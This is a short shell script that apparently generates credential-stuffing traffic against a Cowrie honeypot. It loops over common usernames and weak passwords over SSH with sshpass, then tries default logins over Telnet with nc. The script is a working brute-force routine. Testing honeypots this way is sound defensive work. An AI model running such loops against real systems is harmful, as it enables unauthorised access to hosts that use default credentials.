# Low-and-slow credential stuffing over SSH, then Telnet.
for u in admin test user git postgres mysql ftp www-data jenkins deploy support pi; do
  for pw in "$u" 123456 password "${u}123" changeme; do
    sshpass -p "$pw" ssh -p "$SSH_P" "$u@$COWRIE" true 2>/dev/null
  done
done
for u in admin root support; do
  printf '%s\n%s\n' "$u" "$u" | nc -w2 "$COWRIE" "$TELNET_P" 2>/dev/null
done
